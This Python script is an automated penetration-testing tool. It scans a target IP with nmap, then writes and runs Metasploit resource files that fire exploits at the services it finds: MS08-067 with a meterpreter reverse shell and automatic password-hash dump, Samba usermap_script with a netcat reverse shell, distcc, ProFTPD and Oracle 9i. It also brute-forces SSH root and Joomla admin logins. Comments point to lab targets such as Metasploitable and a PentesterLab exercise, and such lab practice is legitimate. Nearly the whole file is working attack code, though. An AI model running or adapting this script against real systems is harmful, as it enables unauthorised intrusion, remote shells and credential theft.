#!/usr/bin/env python
# grab-a-sh.py  
# version just1.
# idea : 05082016
# by code610
#

# imports
import sys
import subprocess
import os
import datetime 	# for 'now'

# defines 
target = sys.argv[1]
pwd = os.getcwd()
allLogs = pwd + '/logs/'
tLogDir = allLogs + target + '/'
rcfile = tLogDir + 'msf.rc'
rcwww = tLogDir + 'www.rc'
rcspool = tLogDir + 'output.msf'
wwwspool = tLogDir + 'output.www'
nmaplogfile = tLogDir + '/nmap-tcp-' + target + '.log'
now = datetime.datetime.now()
today = now.strftime("%d-%m-%Y %H:%M")
postfile = 'post.rc'
path2post = tLogDir + postfile


# test functions:
#

# modules for default FTP (based on 21/tcp)
def check_21(target):
  print '    + loading : current ftp modules'
  print '      + anonymous'
  print ''
  print ''

  saveNetRc('use auxiliary/scanner/ftp/anonymous\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

# saveNetRc('use auxiliary/scanner/ftp/ftp_login\n') # do you want to bruteforce? ;\
  
  saveNetRc('use auxiliary/scanner/ftp/ftp_version\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')


# modules for Microsoft FTPd
def check_21_ms(target): 
  print '    + loading : current M$ ftp modules'
  print '      + ms09_053_ftpd_nlst' # if MS FTP found
  saveNetRc('use exploit/windows/ftp/ms09_053_ftpd_nlst\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('run\n')

# modules for ProFTPD
def check_21_pftpd(target):
  print '    + loading : current ProFTPD modules'
  print '      + proftp_telnet_iac'

  saveNetRc('use exploit/freebsd/ftp/proftp_telnet_iac\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use exploit/linux/ftp/proftp_sreplace\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('run\n')

def check_21_pure(target):
  print '    + loading : current Pure-FTPd'
  print '      + pureftpd_bash_env_exec'
  saveNetRc('use exploit/multi/ftp/pureftpd_bash_env_exec\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('run\n')


# modules for SSH
def check_22(target):
  print '    + loading : current ssh modules:'
  print '      + ssh_version'
  print '      + ssh_enumusers'
  print '      + ssh_login'
  saveNetRc('use auxiliary/scanner/ssh/ssh_version\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/ssh/ssh_enumusers\n')
  saveNetRc('set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/ssh/ssh_login\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt\n')
  saveNetRc('set VERBOSE false\n')
  saveNetRc('set USERNAME root\n')
  saveNetRc('run\n')

# modules for rpcinfo
def check_111(target):
  print '    + loading : current rpc modules:'
  print '      + sunrpc_portmapper'
  print '      + nfsmount' # TODO: check udp
  saveNetRc('use auxiliary/scanner/misc/sunrpc_portmapper\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/nfs/nfsmount\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

# modules for dcerpc
def check_135(target):
  print '    + loading : current dcerpc modules:'
  print '      + ms03_026_dcom'
  print '      + sunrpc_portmapper'
  print '      + tcp_dcerpc_auditor'
  print '      + endpoint_mapper'

  saveNetRc('use exploit/windows/dcerpc/ms03_026_dcom\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/misc/sunrpc_portmapper\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/dcerpc/endpoint_mapper\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

# modules for Samba (139/tcp @Linux)
def check_139_lin(target):
  print '   + loading : current samba modules:'
  print '     + usermap_script'
  saveNetRc('use exploit/multi/samba/usermap_script\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('set PAYLOAD cmd/unix/reverse_netcat\n')
  saveNetRc('set LHOST ' + str(elhost()) + '\n')
  saveNetRc('run\n') # TODO: python -c 'import pty;pty.spawn("/bin/bash")' # to get root

# modules for SMB
def check_139(target):
  print '    + loading : current smb modules:'
  print '      + nbname'
  print '      + smb_enumshares'
  print '      + smb_enumusers_domain'
  print '      + smb_lookupsid'
  print '      + pipe_auditor'
  print '      + pipe_dcerpc_auditor'

  saveNetRc('use auxiliary/scanner/netbios/nbname\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/smb/smb_enumshares\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/smb/smb_enumusers_domain\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/smb/smb_lookupsid\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/smb/pipe_auditor\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/smb/pipe_dcerpc_auditor\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')


# modules if HTTP found 
def check_http(target, rport):
  print '    + loading : http modules ...'
  print '      + http_header'
  print '      + dir_scanner'
  print '      + trace'
  print '      + options'
  print '      + robots_txt'
  print '      + scrapper (get Title)'

  saveNetRc('use auxiliary/scanner/http/http_header\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/dir_scanner\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set THREADS 10\n')
  saveNetRc('set DICTIONARY /usr/share/dirb/wordlists/common.txt\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/trace\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/options\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/robots_txt\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/scraper\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

# modules for Apache
def check_apache(target, rport):
  print '    + loading : apache modules ...'
  print '      + apache_userdir_enum' 
  saveNetRc('use auxiliary/scanner/http/apache_userdir_enum\n')
  saveNetRc('set VERBOSE false\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

# modules for IIS
def check_iis(target, rport):
  print '    + loading : iis modules ...'
  print '      + webdav_scanner'
  saveNetRc('use auxiliary/scanner/http/webdav_scanner\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

# modules for Joomla
def check_joomla(target,rport):
  print '    + loading : joomla modules, port : ', rport
  print '      + joomla_bruteforce'
  print '      + joomla_version'
  print '      + joomla_plugins'
  # TODO: finish joomla_upload_shell.rb 
  # TODO: remember to properly set TARGETURI; see: dir_scanner

  saveWWWRc('use auxiliary/scanner/http/joomla_bruteforce_login\n')
# saveWWWRc('set TARGETURI + ' + targeturi + '\n') TODO
  saveWWWRc('set RHOSTS ' + target + '\n')
  saveWWWRc('set RPORT ' + rport + '\n')
  saveWWWRc('set AUTH_URI /joomla/administrator/index.php \n') # TODO: 3rd param targeturi
  saveWWWRc('set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt\n')
  saveWWWRc('set VERBOSE false\n')
  saveWWWRc('set USERNAME admin\n')
  saveWWWRc('set FORM_URI /joomla/administrator\n')
  saveWWWRc('set STOP_ON_SUCCESS true\n')
  saveWWWRc('run\n') # TODO: get admin's login and escalate to shell 

  saveWWWRc('use auxiliary/scanner/http/joomla_version\n')
  saveWWWRc('set RHOSTS ' + target + '\n')
  saveWWWRc('set RPORT ' + rport + '\n')
  saveWWWRc('run\n')

  saveWWWRc('use auxiliary/scanner/http/joomla_plugins\n')
  saveWWWRc('set RHOSTS ' + target + '\n')
  saveWWWRc('set RPORT ' + rport + '\n')
  saveWWWRc('run\n')

# modules for git
def check_git(target, rport):
  print '    + loading : git modules ...'
  print '      + git_scanner'

  saveNetRc('use auxiliary/scanner/http/git_scanner\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

# modules for Axis2 CTF
def check_axis2(target,rport):
  print '    + loading : axis2 modules...'
  print '      + axis2_lfi_ctf' # you need to add this module to default msf

  saveWWWRc('use auxiliary/scanner/http/axis2_lfi_ctf\n')
  saveWWWRc('set RHOSTS ' + target + '\n')
  saveWWWRc('set RPORT ' + rport + '\n')
  saveWWWRc('run\n')

# test will start during 2nd msf run. 
# links found by dir_scanner are used here to define
# tests for specific http server or webapp
# TODO: more detailed tests...
def check_http_dirs(target): 
  fp = open(rcspool,'r') # read from msf.net output file
  lines = fp.readlines()


  print '[+] Please wait, I\'m reading output from ' + str(rcspool) + '\n'  
  print '[+] Preparing HTTP attacks basing on found directories'
  for line in lines: # TODO add rport because later it will appear as a bug in readSpool()
    if line.find('Found http://') != -1:

      # fix: set new rport
      newport = line.split(':')
      rrport = newport[2].split('/')[0]  # new RPORT for all tests below
      
#      print("Setting new RPORT for this test: " + str(rrport)) # for debug
      if line.find('/administrator/') != -1:
        print '  [+] probably Joomla; preparing tests...'
        check_joomla(target,rrport)

      if line.find('/server-status') != -1:
        print '  [+] Found "/server-status"; probably Apache...'
        # TODO: we need a 'marker' to set apache tests already done (if any) 
        check_apache(target,rrport)

      elif line.find('/axis2/') != -1: # prepared for CTF Axis2 by PentesterLab.com
        # TODO: link to writeup
        print '  [+] probably Axis2; preparing tests...'
	check_axis2(target,rrport)

      elif line.find('/joomla/') != -1:
        print '  [+] probably Joola; preparing tests...'
        check_joomla(target, rrport)

      elif line.find('.git') != -1:
        print '  [+] probably git found; preparing tests...'
        check_git(target, rrport)

# modules if HTTPS found
def check_https(target, rport):
  print '    + loading : https modules ...'
  print '      + http_hsts'
  print '      + cert'
  print '      + ssl'
  print '      + ssl_version'

  saveNetRc('use use auxiliary/scanner/http/http_hsts\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/cert\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT '  + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/ssl\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/http/ssl_version\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('set RPORT ' + rport + '\n')
  saveNetRc('run\n')


def check_445(target):
  print '    + loading : 445 modules ...'
  print '      + ms08_067_netapi'

  saveNetRc('use exploit/windows/smb/ms08_067_netapi\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('set PAYLOAD windows/meterpreter/reverse_tcp\n')
  saveNetRc('set EndOnSession true\n')
  saveNetRc('set LHOST ' + str(elhost()) + '\n')
  makePost(path2post)
  saveNetRc('set AutoRunScript multi_console_command -rc ' + path2post + '\n')
  saveNetRc('run\n')

# modules for Oracle 9i ftp bug in PASS
def check_2100(target):
  print '    + loading : Oracle 9i modules'
  print '      + oracle9i_xdb_ftp_pass'
  print '      + oracle9i_xdb_ftp_unlock'
  saveNetRc('use exploit/windows/ftp/oracle9i_xdb_ftp_pass\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('run\n')
  
  saveNetRc('use exploit/windows/ftp/oracle9i_xdb_ftp_unlock\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('run\n')


# modules for SSDP/UPnP
def check_2869(target):
  print '    + loading : 2869 modules ...'
  print '      + ssdp_msearch'
  print '      + ssdp_amp'

  saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

# modules for DistCC Daemon
def check_3632(target):
  print '    + loading : DistCC Daemon modules' # for Metasploitable 
  print '      + distcc_exec'
  saveNetRc('use exploit/unix/misc/distcc_exec\n')
  saveNetRc('set RHOST ' + target + '\n')
  saveNetRc('set PAYLOAD cmd/unix/bind_perl\n')
  saveNetRc('run\n')

# modules for SSDP/UPnP
def check_5357(target):
  print '    + loading : 5357 modules ...'
  print '      + ssdp_msearch'
  print '      + ssdp_amp'

  saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')

  saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
  saveNetRc('set RHOSTS ' + target + '\n')
  saveNetRc('run\n')


# code functions:
# TODO: readSpool for output.www; more details; ...
def thanks():
# :)
  print '\n'
  print '*'*80
  print '\t\t(let\'s say...) summary:'
  print '*'*80
  print '  Scanned : ', today

  # summary for 1st msf
  print '-'*80
  print '  Summary for 1st output:\n'
  fp1 = open(nmaplogfile, 'r')
  s_ports = fp1.readlines()
  s_i = 0
  for p in s_ports:
    if p.find('open') != -1:
      s_i += 1
#      print p

  # TODO: separate found and prepared here for tests ;)
  print '[+] Ports:'
  print '    Total: ', s_i
  print ''

  # summary for 2nd msf 
  print '-'*80
  print '  Summary for 2nd output:\n' # TODO
#  fp2 = open(wwwspool, 'r') # tmp change for reading output from 1st msf
  fp2 = open(rcspool,'r')
  s_ports2 = fp2.readlines()
  s_i2 = 0
  for p2 in s_ports2:
    if p2.find('Found http') != -1:
      print 'Check link : ', p2

  fp1.close()
  fp2.close()


# for LHOST 
def elhost(): 
  f = os.popen('/sbin/ifconfig eth0 | grep "inet\ addr" | cut -d: -f2 | cut -d" " -f1')
  lhost=f.read()
  return lhost

# RC for meterpreter; now prepared as poc for ms08_067_netapi module (check_445)
def makePost(postme):
  fp = open(path2post,'w')

  fp.write('sysinfo\n')
  fp.write('run post/windows/gather/hashdump\n')
  fp.write('exit\n')
  fp.write('exit\n')
  fp.write('exit\n') # TODO: make-meterpreter-exit bug


# read loglines from output.msf spool
# TODO: grab details to exploit bugs and/or prepare summary
def readSpool(RCfp):
  print '[+] Reading spool from : ', RCfp

  check_http_dirs(target)

  print '[+] Finished reading spool from : ', RCfp

# run msfconsole with defined RC file
def runMsfScan(RCfp):
  print '[i] Starting Metasploit with RC file : ', RCfp
  exe = 'msfconsole -r ' + RCfp
  subprocess.call([ exe ], shell=True)
  print '[+] Finished Metasploit tests for : ', RCfp

# save line to RC file for 2nd msf run (www tests)
def saveWWWRc(line):
  fp = open(rcwww, 'a+')
  fp.write(line)

# save line to RC file for 1st msf run
def saveNetRc(line):
  fp = open(rcfile, 'a+')
  fp.write(line)

# read nmap output file
# TODO: grab details from nmap log
def readScan(nmaplogfile):
  print '[+] Reading scan log...'

  fp = open(nmaplogfile,'r')
  ports = fp.readlines()

  for port in ports:
    if port.find('open') != -1:

      tmp_port = port.split('/')
      global rport 
      rport = tmp_port[0]

      if port.find('21/tcp') != -1:
        print '[i] FTP found on port : ', rport
        check_21(target)
        if port.find('Microsoft ftpd') != -1:
          print '[i] Probably Microsoft FTP; preparing...'
          check_21_ms(target) 

      elif port.find('22/tcp') != -1:
        print '[i] SSH found on port :', rport
        check_22(target)

      elif port.find('http') != -1:
        print '[i] HTTP found on port: ', rport
        check_http(target, rport) # test for all http
        if port.find('Apache') != -1:
          print '[i] Probably Apache; preparing...'
          check_apache(target, rport)
        elif port.find('IIS') != -1:
          print '[i] Probably IIS; preparing...'
          check_iis(target, rport)

      elif port.find('111/tcp') != -1:
        print '[i] RPC found on port : ', rport
        check_111(target)

      elif port.find('135/tcp') != -1:
        print '[i] NetBios found on port: ', rport
        check_135(target)

      elif port.find('139/tcp') != -1:
        print '[i] SMB found on port: ', rport
        if port.find('Samba smbd') != -1:
          print '[i] Probably Linux Samba; preparing...'
          check_139_lin(target)
        check_139(target)

      elif port.find('443/tcp') != -1:
        print '[i] HTTPS found on port: ', rport
        check_https(target, rport)
      

      elif port.find('445/tcp') != -1:
        print '[i] MS-DC Active Directory found on port: ', rport
        check_445(target)

      elif port.find('2100/tcp') != -1:
        print '[i] Oracle found on port: ', rport
        check_2100(target)

      elif port.find('2869/tcp') != -1:
        print '[i] SSDP/UPnP found on port: ', rport
        check_2869(target)

      elif port.find('3632/tcp') != -1:
        print '[i] DistCC Daemon found on port: ', rport
        check_3632(target)

      elif port.find('5357/tcp') != -1:
        print '[i] SSDP/UPnP found on port: ', rport
        check_5357(target)

  saveNetRc('exit\n')
  saveWWWRc('exit\n')
  rport = ''
  print '\n[i] Reading log file : done.'

# run nmap against IP and save output to nmap log
def scan(target):
  print '[+] Scanning :', target
  
  exe = 'nmap -sV -T4 -A -P0 -vv -n ' + target + ' -oN ' + nmaplogfile
  print '[+] Started!'
  subprocess.call([ exe ], shell=True)
  print '[+] Finished.'

# check for current RC, if any, move to .old
def moveRc(fp):
  moveme = 'mv ' + str(fp) + ' ' + str(fp) + '.old'
  subprocess.call([ moveme], shell=True)

# prepare environment; dirs, logs, etc...
def prepareEnv():
  print '[+] Preparing environment...'

  # look for old RC files
  if os.path.exists(rcfile):
    print '[!] Old RC file found; moving...'
    moveRc(rcfile)

  if os.path.exists(rcwww):
    print '[!] Old WWW RC file found; moving...'
    moveRc(rcwww)

  # create log dirs
  print '[i] Checking for log directory : ' + allLogs 

  if os.path.isdir(allLogs) != -1:
    try:
      os.mkdir(allLogs)
      print '[+] Log directory created : ' + allLogs
    except OSError, e:
      print '[+] Log directory is already there'

  print '[i] Checking target directory: ' + tLogDir
  if os.path.isdir(tLogDir) != -1:
    try: 
      os.mkdir(tLogDir)
      print '[+] Directory for target should be here: ' + tLogDir
    except OSError, e:
      print '[+] Log directory for target is already created.'

  # preparing RC files (1st line 'spool' to log outputs)
  print '[i] Preparing RC files: '
  if os.path.isfile(rcfile) != -1:
    try:
      fp = open(rcfile,'a+')
      fp.write('spool ' + rcspool + '\n')
      print '[+] Network RC file created at : ' + rcfile
    except OSError, e:
      print e
    except IOError, e:
      print e

  if os.path.isfile(rcwww) != -1:
    try:
      fp = open(rcwww, 'a+')
      fp.write('spool ' + wwwspool + '\n')
      print '[+] HTTP RC file created at : ' + rcwww
    except OSError, e:
      print e
  
# welcome msg + date
# TODO: date to log/summary
def sayHi():
  print ''
  print '*'*80
  print '\t\t\t\tgrabash.py'
  print '*'*80
  print ''
  print '[i] Test started : ', today


# MAIN starter:
# ...
sayHi()
prepareEnv()
#scan(target)

readScan(nmaplogfile)
runMsfScan(rcfile)
readSpool(rcspool) 

runMsfScan(rcwww)
#readSpool(rcwww)

thanks() # TODO: detailed summary
# 
# more:
# http://code610.blogspot.com
#
# cheers :)


